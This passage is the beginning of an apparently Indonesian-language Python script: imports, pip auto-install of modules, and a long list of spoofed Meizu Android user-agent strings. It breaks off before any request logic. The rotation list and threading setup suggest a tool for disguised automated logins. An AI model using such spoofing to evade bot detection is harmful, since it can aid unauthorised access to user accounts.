#-----------------[ IMPORT-MODULE ]-------------------
import requests,bs4,json,os,sys,random,datetime,time,re
import urllib3,rich,base64
from rich.table import Table as me
from rich.console import Console as sol
from bs4 import BeautifulSoup as sop
from bs4 import BeautifulSoup as parser
from concurrent.futures import ThreadPoolExecutor as tred
from rich.console import Group as gp
from rich.panel import Panel as nel
from rich import print as cetak
from rich.markdown import Markdown as mark
from rich.columns import Columns as col
from rich import print as rprint
from rich import pretty
from rich.text import Text as tekz
try:
        import rich
except ImportError:
        cetak(nel('\t• Sedang Menginstall Modul Rich •'))
        os.system('pip install rich')
try:
        import stdiomask
except ImportError:
        cetak(nel('\t• Sedang Menginstall Modul Stdiomask •'))
        os.system('pip install stdiomask')
try:
	import requests
except ImportError:
	cetak(nel('\t• Sedang Menginstall Modul Requests •'))
	os.system('pip install requests && pip install mechanize ')
#------------------[ USER-AGENT ]-------------------#
pretty.install()
CON=sol()
ugen2=["Mozilla\/5.0 (Linux; U; Android 6.0; zh-CN; MZ-MEIZU_M5 Build\/MRA58K) AppleWebKit\/537.36 (KHTML, like Gecko) Version\/4.0 Chrome\/40.0.2214.89 MZBrowser\/6.10.110-2018052111 UWS\/2.11.0.33 Mobile Safari\/537.36","Mozilla\/5.0 (Linux; U; Android 6.0; zh-CN; MZ-MEIZU M6 Build\/MRA58K) AppleWebKit\/537.36 (KHTML, like Gecko) Version\/4.0 Chrome\/40.0.2214.89 MZBrowser\/7.1.110-2018072414 UWS\/2.11.0.33 Mobile Safari\/537.36","Mozilla\/5.0 (Linux; U; Android 6.0; zh-CN; MZ-U20 Build\/MRA58K) AppleWebKit\/537.36 (KHTML, like Gecko) Version\/4.0 Chrome\/40.0.2214.89 MZBrowser\/7.1.110-2018072414 UWS\/2.11.0.33 Mobile Safari\/537.36","Mozilla\/5.0 (Linux; U; Android 6.0; zh-CN; MZ-m2 Build\/MRA58K) AppleWebKit\/537.36 (KHTML, like Gecko) Version\/4.0 Chrome\/40.0.2214.89 MZBrowser\/7.1.110-2018072414 UWS\/2.11.0.33 Mobile Safari\/537.36","Mozilla\/5.0 (Linux; U; Android 6.0; zh-CN; MZ-MX6 Build\/MRA58K) AppleWebKit\/537.36 (KHTML, like Gecko) Version\/4.0 Chrome\/40.0.2214.89 MZBrowser\/7.1.110-2018072414 UWS\/2.11.0.33 Mobile Safari\/537.36","Mozilla\/5.0 (Linux; U; Android 6.0; zh-CN; MZ-Meizu M6s Build\/MRA58K) AppleWebKit\/537.36 (KHTML, like Gecko) Version\/4.0 Chrome\/40.0.2214.89 MZBrowser\/7.1.110-2018072414 UWS\/2.11.0.33 Mobile Safari\/537.36","Mozilla\/5.0 (Linux; U; Android 5.1; zh-CN; MZ-M3s Build\/MRA58K) AppleWebKit\/537.36 (KHTML, like Gecko) Version\/4.0 Chrome\/57.0.2987.108 MZBrowser\/7.2.110-2018082915 UWS\/2.15.0.2 Mobile Safari\/537.36","Mozilla\/5.0 (Linux; U; Android 6.0; zh-CN; MZ-U20 Build\/MRA58K) AppleWebKit\/537.36 (KHTML, like Gecko) Version\/4.0 Chrome\/57.0.2987.108 MZBrowser\/7.2.110-2018082915 UWS\/2.15.0.2 Mobile Safari\/537.36","Mozilla\/5.0 (Linux; U; Android 6.0; zh-CN; MZ-U10 Build\/MRA58K) AppleWebKit\/537.36 (KHTML, like Gecko) Version\/4.0 Chrome\/57.0.2987.108 MZBrowser\/7.2.110-2018082915 UWS\/2.15.0.2 Mobile Safari\/537.36","Mozilla\/5.0 (Linux; U; Android 6.0; zh-CN; MZ-M3 Max Build\/MRA58K) AppleWebKit\/537.36 (KHTML, like Gecko) Version\/4.0 Chrome\/57.0.2987.108 MZBrowser\/7.2.110-2018082915 UWS\/2.15.0.2 Mobile Safari\/537.36","Mozilla\/5.0 (Linux; U; Android 7.0; zh-CN; MZ-MEIZU M6 Build\/MRA58K) AppleWebKit\/537.36 (KHTML, like Gecko) Version\/4.0 Chrome\/57.0.2987.108 MZBrowser\/7.2.110-2018082915 UWS\/2.15.0.2 Mobile Safari\/537.36","Mozilla\/5.0 (Linux; U; Android 5.1; zh-CN; MZ-M3s Build\/MRA58K) AppleWebKit\/537.36 (KHTML, like Gecko) Version\/4.0 Chrome\/57.0.2987.108 MZBrowser\/7.4.110-2018101016 UWS\/2.15.0.2 Mobile Safari\/537.36","Mozilla\/5.0 (Linux; U; Android 6.0; zh-CN; MZ-M5s Build\/MRA58K) AppleWebKit\/537.36 (KHTML, like Gecko) Version\/4.0 Chrome\/57.0.2987.108 MZBrowser\/7.4.110-2018101016 UWS\/2.15.0.2 Mobile Safari\/537.36","Mozilla\/5.0 (Linux; U; Android 5.1; zh-CN; MZ-m2 note Build\/MRA58K) AppleWebKit\/537.36 (KHTML, like Gecko) Version\/4.0 Chrome\/57.0.2987.108 MZBrowser\/7.4.110-2018101016 UWS\/2.15.0.2 Mobile Safari\/537.36","Mozilla\/5.0 (Linux; U; Android 6.0; zh-CN; MZ-MEIZU_M5 Build\/MRA58K) AppleWebKit\/537.36 (KHTML, like Gecko) Version\/4.0 Chrome\/57.0.2987.108 MZBrowser\/7.4.110-2018101016 UWS\/2.15.0.2 Mobile Safari\/537.36","Mozilla\/5.0 (Linux; U; Android 6.0; zh-CN; MZ-U10 Build\/MRA58K) AppleWebKit\/537.36 (KHTML, like Gecko) Version\/4.0 Chrome\/57.0.2987.108 MZBrowser\/7.4.110-2018101016 UWS\/2.15.0.2 Mobile Safari\/537.36","Mozilla\/5.0 (Linux; U; Android 6.0; zh-CN; MZ-M5 Note Build\/MRA58K) AppleWebKit\/537.36 (KHTML, like Gecko) Version\/4.0 Chrome\/57.0.2987.108 MZBrowser\/7.4.110-2018101016 UWS\/2.15.0.2 Mobile Safari\/537.36","Mozilla\/5.0 (Linux; U; Android 7.0; zh-CN; MZ-M6T Build\/MRA58K) AppleWebKit\/537.36 (KHTML, like Gecko) Version\/4.0 Chrome\/57.0.2987.108 MZBrowser\/7.5.110-2018110721 UWS\/2.15.0.2 Mobile Safari\/537.36","Mozilla\/5.0 (Linux; U; Android 7.0; zh-CN; MZ-PRO 7 Plus Build\/MRA58K) AppleWebKit\/537.36 (KHTML, like Gecko) Version\/4.0 Chrome\/57.0.2987.108 MZBrowser\/7.5.110-2018110721 UWS\/2.15.0.2 Mobile Safari\/537.36","Mozilla\/5.0 (Linux; U; Android 6.0; zh-CN; MZ-MEIZU M6 Build\/MRA58K) AppleWebKit\/537.36 (KHTML, like Gecko) Version\/4.0 Chrome\/40.0.2214.89 MZBrowser\/7.1.122-2018082410 UWS\/2.11.0.33 Mobile Safari\/537.36","Mozilla\/5.0 (Linux; U; Android 5.1; zh-CN; MZ-m3 note Build\/MRA58K) AppleWebKit\/537.36 (KHTML, like Gecko) Version\/4.0 Chrome\/57.0.2987.108 MZBrowser\/7.6.110-2018121017 UWS\/2.15.0.2 Mobile Safari\/537.36","Mozilla\/5.0 (Linux; U; Android 6.0; zh-CN; MZ-meizu C9 Build\/MRA58K) AppleWebKit\/537.36 (KHTML, like Gecko) Version\/4.0 Chrome\/40.0.2214.89 MZBrowser\/7.99.141-2018092915 UWS\/2.11.0.33 Mobile Safari\/537.36","Mozilla\/5.0 (Linux; U; Android 6.0; zh-CN; MZ-PRO 7 Plus Build\/MRA58K) AppleWebKit\/537.36 (KHTML, like Gecko) Version\/4.0 Chrome\/40.0.2214.89 MZBrowser\/7.1.122-2018082410 UWS\/2.11.0.33 Mobile Safari\/537.36","Mozilla\/5.0 (Linux; U; Android 5.1; zh-CN; MZ-m2 Build\/MRA58K) AppleWebKit\/537.36 (KHTML, like Gecko) Version\/4.0 Chrome\/57.0.2987.108 MZBrowser\/7.7.110-2019010410 UWS\/2.15.0.2 Mobile Safari\/537.36","Mozilla\/5.0 (Linux; U; Android 7.0; zh-CN; MZ-MEIZU M6 Build\/MRA58K) AppleWebKit\/537.36 (KHTML, like Gecko) Version\/4.0 Chrome\/57.0.2987.108 MZBrowser\/7.5.110-2018110721 UWS\/2.15.0.2 Mobile Safari\/537.36","Mozilla\/5.0 (Linux; U; Android 7.1.2; zh-CN; MZ-M6 Note Build\/MRA58K) AppleWebKit\/537.36 (KHTML, like Gecko) Version\/4.0 Chrome\/57.0.2987.108 MZBrowser\/7.7.110-2019010410 UWS\/2.15.0.2 Mobile Safari\/537.36","Mozilla\/5.0 (Linux; U; Android 6.0; zh-CN; MZ-PRO 6 Build\/MRA58K) AppleWebKit\/537.36 (KHTML, like Gecko) Version\/4.0 Chrome\/57.0.2987.108 MZBrowser\/7.7.110-2019010410 UWS\/2.15.0.2 Mobile Safari\/537.36","Mozilla\/5.0 (Linux; U; Android 7.0; zh-CN; MZ-MEIZU M6 Build\/MRA58K) AppleWebKit\/537.36 (KHTML, like Gecko) Version\/4.0 Chrome\/57.0.2987.108 MZBrowser\/7.7.110-2019010410 UWS\/2.15.0.2 Mobile Safari\/537.36","Mozilla\/5.0 (Linux; U; Android 7.0.0; zh-CN; MZ-PRO 6 Plus Build\/MRA58K) AppleWebKit\/537.36 (KHTML, like Gecko) Version\/4.0 Chrome\/57.0.2987.108 MZBrowser\/7.6.110-2018121017 UWS\/2.15.0.2 Mobile Safari\/537.36","Mozilla\/5.0 (Linux; U; Android 7.0; zh-CN; MZ-M6T Build\/MRA58K) AppleWebKit\/537.36 (KHTML, like Gecko) Version\/4.0 Chrome\/57.0.2987.108 MZBrowser\/7.7.110-2019010410 UWS\/2.15.0.2 Mobile Safari\/537.36","Mozilla\/5.0 (Linux; U; Android 6.0; zh-CN; MZ-M3E Build\/MRA58K) AppleWebKit\/537.36 (KHTML, like Gecko) Version\/4.0 Chrome\/57.0.2987.108 MZBrowser\/7.7.110-2019010410 UWS\/2.15.0.2 Mobile Safari\/537.36","Mozilla\/5.0 (Linux; U; Android 7.0; zh-CN; MZ-M5 Note Build\/MRA58K) AppleWebKit\/537.36 (KHTML, like Gecko) Version\/4.0 Chrome\/57.0.2987.108 MZBrowser\/7.9.210-2019062516 UWS\/2.15.0.4 Mobile Safari\/537.36","Mozilla\/5.0 (Linux; U; Android 5.1; zh-CN; MZ-m2 note Build\/MRA58K) AppleWebKit\/537.36 (KHTML, like Gecko) Version\/4.0 Chrome\/57.0.2987.108 MZBrowser\/7.8.110-2019031217 UWS\/2.15.0.4 Mobile Safari\/537.36","Mozilla\/5.0 (Linux; U; Android 7.1.2; zh-CN; MZ-M6 Note Build\/MRA58K) AppleWebKit\/537.36 (KHTML, like Gecko) Version\/4.0 Chrome\/57.0.2987.108 MZBrowser\/7.9.210-2019062516 UWS\/2.15.0.4 Mobile Safari\/537.36","Mozilla\/5.0 (Linux; U; Android 5.1; zh-CN; MZ-m2 Build\/MRA58K) AppleWebKit\/537.36 (KHTML, like Gecko) Version\/4.0 Chrome\/57.0.2987.108 MZBrowser\/7.10.110-2019071815 UWS\/2.15.0.4 Mobile Safari\/537.36","Mozilla\/5.0 (Linux; U; Android 7.0; zh-CN; MZ-M6T Build\/MRA58K) AppleWebKit\/537.36 (KHTML, like Gecko) Version\/4.0 Chrome\/57.0.2987.108 MZBrowser\/7.9.210-2019062516 UWS\/2.15.0.4 Mobile Safari\/537.36","Mozilla\/5.0 (Linux; U; Android 7.0.0; zh-CN; MZ-PRO 6 Plus Build\/MRA58K) AppleWebKit\/537.36 (KHTML, like Gecko) Version\/4.0 Chrome\/57.0.2987.108 MZBrowser\/7.8.110-2019031217 UWS\/2.15.0.4 Mobile Safari\/537.36","Mozilla\/5.0 (Linux; U; Android 7.0; zh-CN; MZ-M5 Note Build\/MRA58K) AppleWebKit\/537.36 (KHTML, like Gecko) Version\/4.0 Chrome\/57.0.2987.108 MZBrowser\/7.10.110-2019071815 UWS\/2.15.0.4 Mobile Safari\/537.36","Mozilla\/5.0 (Linux; U; Android 5.1; zh-CN; MZ-MX4 Build\/MRA58K) AppleWebKit\/537.36 (KHTML, like Gecko) Version\/4.0 Chrome\/57.0.2987.108 MZBrowser\/7.8.110-2019031217 UWS\/2.15.0.4 Mobile Safari\/537.36","Mozilla\/5.0 (Linux; U; Android 5.1; zh-CN; MZ-MX4 Build\/MRA58K) AppleWebKit\/537.36 (KHTML, like Gecko) Version\/4.0 Chrome\/57.0.2987.108 MZBrowser\/7.10.110-2019071815 UWS\/2.15.0.4 Mobile Safari\/537.36","Mozilla\/5.0 (Linux; U; Android 6.0; zh-CN; MZ-PRO 6 Build\/MRA58K) AppleWebKit\/537.36 (KHTML, like Gecko) Version\/4.0 Chrome\/40.0.2214.89 MZBrowser\/6.9.520-2018051516 UWS\/2.11.0.33 Mobile Safari\/537.36","Mozilla\/5.0 (Linux; U; Android 6.0.1; zh-CN; MZ-PRO 6 Plus Build\/MRA58K) AppleWebKit\/537.36 (KHTML, like Gecko) Version\/4.0 Chrome\/57.0.2987.108 MZBrowser\/7.9.210-2019062516 UWS\/2.15.0.4 Mobile Safari\/537.36","Mozilla\/5.0 (Linux; U; Android 6.0; zh-CN; MZ-M6T Build\/MRA58K) AppleWebKit\/537.36 (KHTML, like Gecko) Version\/4.0 Chrome\/40.0.2214.89 MZBrowser\/6.9.520-2018082214 UWS\/2.11.0.33 Mobile Safari\/537.36","Mozilla\/5.0 (Linux; U; Android 7.1.1; zh-CN; MZ-MX6 Build\/MRA58K) AppleWebKit\/537.36 (KHTML, like Gecko) Version\/4.0 Chrome\/57.0.2987.108 MZBrowser\/7.10.110-2019071815 UWS\/2.15.0.4 Mobile Safari\/537.36","Mozilla\/5.0 (Linux; U; Android 6.0; zh-CN; MZ-M3 Max Build\/MRA58K) AppleWebKit\/537.36 (KHTML, like Gecko) Version\/4.0 Chrome\/40.0.2214.89 MZBrowser\/7.1.110-2018072414 UWS\/2.11.0.33 Mobile Safari\/537.36","Mozilla\/5.0 (Linux; U; Android 8.1.0; zh-CN; MZ-meizu X8 Build\/MRA58K) AppleWebKit\/537.36 (KHTML, like Gecko) Version\/4.0 Chrome\/57.0.2987.108 MZBrowser\/7.2.120-2018092510 UWS\/2.15.0.2 Mobile Safari\/537.36","Mozilla\/5.0 (Linux; U; Android 8.1.0; zh-CN; MZ-meizu M8 Build\/MRA58K) AppleWebKit\/537.36 (KHTML, like Gecko) Version\/4.0 Chrome\/57.0.2987.108 MZBrowser\/7.2.120-2018102909 UWS\/2.15.0.2 Mobile Safari\/537.36","Mozilla\/5.0 (Linux; U; Android 6.0; zh-CN; MZ-M3_s Build\/MRA58K) AppleWebKit\/537.36 (KHTML, like Gecko) Version\/4.0 Chrome\/40.0.2214.89 MZBrowser\/6.9.520-2018031519 UWS\/2.11.0.33 Mobile Safari\/537.36","Mozilla\/5.0 (Linux; U; Android 7.0; zh-CN; MZ-PRO 7 Build\/MRA58K) AppleWebKit\/537.36 (KHTML, like Gecko) Version\/4.0 Chrome\/57.0.2987.108 MZBrowser\/7.8.110-2019031217 UWS\/2.15.0.4 Mobile Safari\/537.36","Mozilla\/5.0 (Linux; U; Android 7.1.2; zh-CN; MZ-M6 Note Build\/MRA58K) AppleWebKit\/537.36 (KHTML, like Gecko) Version\/4.0 Chrome\/57.0.2987.108 MZBrowser\/7.12.110-2019110416 UWS\/2.15.0.4 Mobile Safari\/537.36","Mozilla\/5.0 (Linux; U; Android 5.1; zh-CN; MZ-PRO 5 Build\/MRA58K) AppleWebKit\/537.36 (KHTML, like Gecko) Version\/4.0 Chrome\/57.0.2987.108 MZBrowser\/7.12.110-2019110416 UWS\/2.15.0.4 Mobile Safari\/537.36","Mozilla\/5.0 (Linux; U; Android 6.0; zh-CN; MZ-PRO 6 Build\/MRA58K) AppleWebKit\/537.36 (KHTML, like Gecko) Version\/4.0 Chrome\/57.0.2987.108 MZBrowser\/7.12.110-2019110416 UWS\/2.15.0.4 Mobile Safari\/537.36","Mozilla\/5.0 (Linux; U; Android 6.0; zh-CN; MZ-MX6 Build\/MRA58K) AppleWebKit\/537.36 (KHTML, like Gecko) Version\/4.0 Chrome\/57.0.2987.108 MZBrowser\/7.12.110-2019110416 UWS\/2.15.0.4 Mobile Safari\/537.36","Mozilla\/5.0 (Linux; U; Android 5.1; zh-CN; MZ-M3 Build\/MRA58K) AppleWebKit\/537.36 (KHTML, like Gecko) Version\/4.0 Chrome\/57.0.2987.108 MZBrowser\/7.13.110-2019112819 UWS\/2.15.0.4 Mobile Safari\/537.36","Mozilla\/5.0 (Linux; U; Android 9; zh-CN; MZ-Nokia 5.1 Build\/MRA58K) AppleWebKit\/537.36 (KHTML, like Gecko) Version\/4.0 Chrome\/62.0.3202.97 MZBrowser\/8.9.0 Mobile Safari\/537.36","Mozilla\/5.0 (Linux; U; Android 9; zh-CN; MZ-Nokia 5.1 Build\/MRA58K) AppleWebKit\/537.36 (KHTML, like Gecko) Version\/4.0 Chrome\/57.0.2987.108 MZBrowser\/8.1.310-2020040818 UWS\/2.15.0.4 Mobile Safari\/537.36","Mozilla\/5.0 (Linux; U; Android 5.1.1; zh-CN; MZ-MX4 Pro Build\/MRA58K) AppleWebKit\/537.36 (KHTML, like Gecko) Version\/4.0 Chrome\/40.0.2214.89 MZBrowser\/7.4.1 UWS\/2.11.0.34 Mobile Safari\/537.36","Mozilla\/5.0 (Linux; U; Android 5.1; zh-CN; MZ-m1 note Build\/MRA58K) AppleWebKit\/537.36 (KHTML, like Gecko) Version\/4.0 Chrome\/57.0.2987.108 MZBrowser\/8.1.310-2020040818 UWS\/2.15.0.4 Mobile Safari\/537.36","Mozilla\/5.0 (Linux; U; Android 7.0; zh-CN; MZ-M6T Build\/MRA58K) AppleWebKit\/537.36 (KHTML, like Gecko) Version\/4.0 Chrome\/57.0.2987.108 MZBrowser\/8.1.310-2020040818 UWS\/2.15.0.4 Mobile Safari\/537.36","Mozilla\/5.0 (Linux; U; Android 7.1.1; zh-CN; MZ-15 Build\/MRA58K) AppleWebKit\/537.36 (KHTML, like Gecko) Version\/4.0 Chrome\/57.0.2987.108 MZBrowser\/8.1.310-2020040818 UWS\/2.MZ-15.0.4 Mobile Safari\/537.36","Mozilla\/5.0 (Linux; U; Android 7.0; zh-CN; MZ-M5 Note Build\/MRA58K) AppleWebKit\/537.36 (KHTML, like Gecko) Version\/4.0 Chrome\/57.0.2987.108 MZBrowser\/8.2.110-2020060117 UWS\/2.15.0.4 Mobile Safari\/537.36","Mozilla\/5.0 (Linux; U; Android 6.0; zh-CN; MZ-U10 Build\/MRA58K) AppleWebKit\/537.36 (KHTML, like Gecko) Version\/4.0 Chrome\/57.0.2987.108 MZBrowser\/8.2.110-2020060117 UWS\/2.15.0.4 Mobile Safari\/537.36","Mozilla\/5.0 (Linux; U; Android 5.1; zh-CN; MZ-m2 Build\/MRA58K) AppleWebKit\/537.36 (KHTML, like Gecko) Version\/4.0 Chrome\/57.0.2987.108 MZBrowser\/8.2.110-2020060117 UWS\/2.15.0.4 Mobile Safari\/537.36","Mozilla\/5.0 (Linux; U; Android 5.1; zh-CN; MZ-m3 note Build\/MRA58K) AppleWebKit\/537.36 (KHTML, like Gecko) Version\/4.0 Chrome\/57.0.2987.108 MZBrowser\/8.2.110-2020060117 UWS\/2.15.0.4 Mobile Safari\/537.36","Mozilla\/5.0 (Linux; U; Android 6.0; zh-CN; MZ-M5s Build\/MRA58K) AppleWebKit\/537.36 (KHTML, like Gecko) Version\/4.0 Chrome\/57.0.2987.108 MZBrowser\/8.2.110-2020060117 UWS\/2.15.0.4 Mobile Safari\/537.36","Mozilla\/5.0 (Linux; U; Android 5.1; zh-CN; MZ-M3s Build\/MRA58K) AppleWebKit\/537.36 (KHTML, like Gecko) Version\/4.0 Chrome\/57.0.2987.108 MZBrowser\/8.2.110-2020060117 UWS\/2.15.0.4 Mobile Safari\/537.36","Mozilla\/5.0 (Linux; U; Android 6.0; zh-CN; MZ-M5c Build\/MRA58K) AppleWebKit\/537.36 (KHTML, like Gecko) Version\/4.0 Chrome\/57.0.2987.108 MZBrowser\/8.2.110-2020060117 UWS\/2.15.0.4 Mobile Safari\/537.36","Mozilla\/5.0 (Linux; U; Android 9; zh-CN; MZ-meizu 16Xs Build\/MRA58K) AppleWebKit\/537.36 (KHTML, like Gecko) Version\/4.0 Chrome\/57.0.2987.108 MZBrowser\/8.2.110-2020060117 UWS\/2.15.0.4 Mobile Safari\/537.36","Mozilla\/5.0 (Linux; U; Android 6.0; zh-CN; MZ-M3 Max Build\/MRA58K) AppleWebKit\/537.36 (KHTML, like Gecko) Version\/4.0 Chrome\/57.0.2987.108 MZBrowser\/8.2.110-2020060117 UWS\/2.15.0.4 Mobile Safari\/537.36","Mozilla\/5.0 (Linux; U; Android 6.0; zh-CN; MZ-MEIZU_M5 Build\/MRA58K) AppleWebKit\/537.36 (KHTML, like Gecko) Version\/4.0 Chrome\/57.0.2987.108 MZBrowser\/8.2.110-2020060117 UWS\/2.15.0.4 Mobile Safari\/537.36","Mozilla\/5.0 (Linux; U; Android 7.0; zh-CN; MZ-M6T Build\/MRA58K) AppleWebKit\/537.36 (KHTML, like Gecko) Version\/4.0 Chrome\/57.0.2987.108 MZBrowser\/8.2.110-2020060117 UWS\/2.15.0.4 Mobile Safari\/537.36","Mozilla\/5.0 (Linux; U; Android 7.1.2; zh-CN; MZ-M6 Note Build\/MRA58K) AppleWebKit\/537.36 (KHTML, like Gecko) Version\/4.0 Chrome\/62.0.3202.97 MZBrowser\/8.11.5 Mobile Safari\/537.36","Mozilla\/5.0 (Linux; U; Android 5.1; zh-CN; MZ-m2 note Build\/MRA58K) AppleWebKit\/537.36 (KHTML, like Gecko) Version\/4.0 Chrome\/57.0.2987.108 MZBrowser\/8.2.110-2020060117 UWS\/2.15.0.4 Mobile Safari\/537.36","Mozilla\/5.0 (Linux; U; Android 7.1.2; zh-CN; MZ-M6 Note Build\/MRA58K) AppleWebKit\/537.36 (KHTML, like Gecko) Version\/4.0 Chrome\/62.0.3202.97 MZBrowser\/8.9.0 Mobile Safari\/537.36","Mozilla\/5.0 (Linux; U; Android 5.1; zh-CN; MZ-PRO 5 Build\/MRA58K) AppleWebKit\/537.36 (KHTML, like Gecko) Version\/4.0 Chrome\/57.0.2987.108 MZBrowser\/8.2.110-2020060117 UWS\/2.15.0.4 Mobile Safari\/537.36","Mozilla\/5.0 (Linux; U; Android 6.0; zh-CN; MZ-PRO 6 Build\/MRA58K) AppleWebKit\/537.36 (KHTML, like Gecko) Version\/4.0 Chrome\/57.0.2987.108 MZBrowser\/8.2.110-2020060117 UWS\/2.15.0.4 Mobile Safari\/537.36","Mozilla\/5.0 (Linux; U; Android 7.1.2; zh-CN; MZ-M6 Note Build\/MRA58K) AppleWebKit\/537.36 (KHTML, like Gecko) Version\/4.0 Chrome\/57.0.2987.108 MZBrowser\/8.2.110-2020060117 UWS\/2.15.0.4 Mobile Safari\/537.36","Mozilla\/5.0 (Linux; U; Android 7.0.0; zh-CN; MZ-PRO 6 Plus Build\/MRA58K) AppleWebKit\/537.36 (KHTML, like Gecko) Version\/4.0 Chrome\/57.0.2987.108 MZBrowser\/8.2.110-2020060117 UWS\/2.15.0.4 Mobile Safari\/537.36","Mozilla\/5.0 (Linux; U; Android 8.1.0; zh-CN; MZ-meizu X8 Build\/MRA58K) AppleWebKit\/537.36 (KHTML, like Gecko) Version\/4.0 Chrome\/57.0.2987.108 MZBrowser\/8.2.110-2020060117 UWS\/2.15.0.4 Mobile Safari\/537.36","Mozilla\/5.0 (Linux; U; Android 6.0; zh-CN; MZ-PRO 6 Build\/MRA58K) AppleWebKit\/537.36 (KHTML, like Gecko) Version\/4.0 Chrome\/57.0.2987.108 MZBrowser\/7.2.110-2018082915 UWS\/2.15.0.2 Mobile Safari\/537.36","Mozilla\/5.0 (Linux; U; Android 8.1.0; zh-CN; MZ-16 Build\/MRA58K) AppleWebKit\/537.36 (KHTML, like Gecko) Version\/4.0 Chrome\/57.0.2987.108 MZBrowser\/8.2.110-2020060117 UWS\/2.15.0.4 Mobile Safari\/537.36","Mozilla\/5.0 (Linux; U; Android 5.1; zh-CN; MZ-m3 Build\/MRA58K) AppleWebKit\/537.36 (KHTML, like Gecko) Version\/4.0 Chrome\/57.0.2987.108 MZBrowser\/7.9.110-2019060317 UWS\/2.15.0.4 Mobile Safari\/537.36","Mozilla\/5.0 (Linux; U; Android 9; zh-CN; MZ-meizu note9 Build\/MRA58K) AppleWebKit\/537.36 (KHTML, like Gecko) Version\/4.0 Chrome\/57.0.2987.108 MZBrowser\/8.2.110-2020060117 UWS\/2.15.0.4 Mobile Safari\/537.36","Mozilla\/5.0 (Linux; U; Android 6.0; zh-CN; MZ-U20 Build\/MRA58K) AppleWebKit\/537.36 (KHTML, like Gecko) Version\/4.0 Chrome\/57.0.2987.108 MZBrowser\/8.2.110-2020060117 UWS\/2.15.0.4 Mobile Safari\/537.36","Mozilla\/5.0 (Linux; U; Android 7.0; zh-CN; MZ-MEIZU M6 Build\/MRA58K) AppleWebKit\/537.36 (KHTML, like Gecko) Version\/4.0 Chrome\/57.0.2987.108 MZBrowser\/8.2.110-2020060117 UWS\/2.15.0.4 Mobile Safari\/537.36","Mozilla\/5.0 (Linux; U; Android 6.0; zh-CN; MZ-M5 Note Build\/MRA58K) AppleWebKit\/537.36 (KHTML, like Gecko) Version\/4.0 Chrome\/57.0.2987.108 MZBrowser\/8.2.110-2020060117 UWS\/2.15.0.4 Mobile Safari\/537.36","Mozilla\/5.0 (Linux; U; Android 6.0; zh-CN; MZ-M3E Build\/MRA58K) AppleWebKit\/537.36 (KHTML, like Gecko) Version\/4.0 Chrome\/57.0.2987.108 MZBrowser\/8.2.110-2020060117 UWS\/2.15.0.4 Mobile Safari\/537.36","Mozilla\/5.0 (Linux; U; Android 7.0; zh-CN; MZ-PRO 7 Build\/MRA58K) AppleWebKit\/537.36 (KHTML, like Gecko) Version\/4.0 Chrome\/57.0.2987.108 MZBrowser\/8.2.110-2020060117 UWS\/2.15.0.4 Mobile Safari\/537.36","Mozilla\/5.0 (Linux; U; Android 5.1.1; zh-CN; MZ-MX4 Pro Build\/MRA58K) AppleWebKit\/537.36 (KHTML, like Gecko) Version\/4.0 Chrome\/57.0.2987.108 MZBrowser\/8.2.210-2020061519 UWS\/2.15.0.4 Mobile Safari\/537.36","Mozilla\/5.0 (Linux; U; Android 8.1.0; zh-CN; MZ-meizu note8 Build\/MRA58K) AppleWebKit\/537.36 (KHTML, like Gecko) Version\/4.0 Chrome\/57.0.2987.108 MZBrowser\/8.2.210-2020061519 UWS\/2.15.0.4 Mobile Safari\/537.36","Mozilla\/5.0 (Linux; U; Android 6.0; zh-CN; MZ-M5s Build\/MRA58K) AppleWebKit\/537.36 (KHTML, like Gecko) Version\/4.0 Chrome\/57.0.2987.108 MZBrowser\/8.2.210-2020061519 UWS\/2.15.0.4 Mobile Safari\/537.36","Mozilla\/5.0 (Linux; U; Android 6.0; zh-CN; MZ-MEIZU_M5 Build\/MRA58K) AppleWebKit\/537.36 (KHTML, like Gecko) Version\/4.0 Chrome\/57.0.2987.108 MZBrowser\/8.2.210-2020061519 UWS\/2.15.0.4 Mobile Safari\/537.36","Mozilla\/5.0 (Linux; U; Android 6.0; zh-CN; MZ-M5c Build\/MRA58K) AppleWebKit\/537.36 (KHTML, like Gecko) Version\/4.0 Chrome\/57.0.2987.108 MZBrowser\/8.2.210-2020061519 UWS\/2.15.0.4 Mobile Safari\/537.36","Mozilla\/5.0 (Linux; U; Android 5.1; zh-CN; MZ-m2 Build\/MRA58K) AppleWebKit\/537.36 (KHTML, like Gecko) Version\/4.0 Chrome\/57.0.2987.108 MZBrowser\/8.2.210-2020061519 UWS\/2.15.0.4 Mobile Safari\/537.36","Mozilla\/5.0 (Linux; U; Android 7.1.1; zh-CN; MZ-MX6 Build\/MRA58K) AppleWebKit\/537.36 (KHTML, like Gecko) Version\/4.0 Chrome\/57.0.2987.108 MZBrowser\/8.2.210-2020061519 UWS\/2.15.0.4 Mobile Safari\/537.36","Mozilla\/5.0 (Linux; U; Android 5.1; zh-CN; MZ-m2 note Build\/MRA58K) AppleWebKit\/537.36 (KHTML, like Gecko) Version\/4.0 Chrome\/57.0.2987.108 MZBrowser\/8.2.210-2020061519 UWS\/2.15.0.4 Mobile Safari\/537.36","Mozilla\/5.0 (Linux; U; Android 7.1.2; zh-CN; MZ-M6 Note Build\/MRA58K) AppleWebKit\/537.36 (KHTML, like Gecko) Version\/4.0 Chrome\/57.0.2987.108 MZBrowser\/8.2.210-2020061519 UWS\/2.15.0.4 Mobile Safari\/537.36","Mozilla\/5.0 (Linux; U; Android 7.0; zh-CN; MZ-Meizu M6s Build\/MRA58K) AppleWebKit\/537.36 (KHTML, like Gecko) Version\/4.0 Chrome\/57.0.2987.108 MZBrowser\/8.2.210-2020061519 UWS\/2.15.0.4 Mobile Safari\/537.36","Mozilla\/5.0 (Linux; U; Android 5.1; zh-CN; MZ-m3 note Build\/MRA58K) AppleWebKit\/537.36 (KHTML, like Gecko) Version\/4.0 Chrome\/57.0.2987.108 MZBrowser\/8.2.210-2020061519 UWS\/2.15.0.4 Mobile Safari\/537.36","Mozilla\/5.0 (Linux; U; Android 5.1; zh-CN; MZ-M3s Build\/MRA58K) AppleWebKit\/537.36 (KHTML, like Gecko) Version\/4.0 Chrome\/57.0.2987.108 MZBrowser\/8.2.210-2020061519 UWS\/2.15.0.4 Mobile Safari\/537.36","Mozilla\/5.0 (Linux; U; Android 7.0; zh-CN; MZ-M5 Note Build\/MRA58K) AppleWebKit\/537.36 (KHTML, like Gecko) Version\/4.0 Chrome\/57.0.2987.108 MZBrowser\/8.2.210-2020061519 UWS\/2.15.0.4 Mobile Safari\/537.36","Mozilla\/5.0 (Linux; U; Android 6.0; zh-CN; MZ-U20 Build\/MRA58K) AppleWebKit\/537.36 (KHTML, like Gecko) Version\/4.0 Chrome\/57.0.2987.108 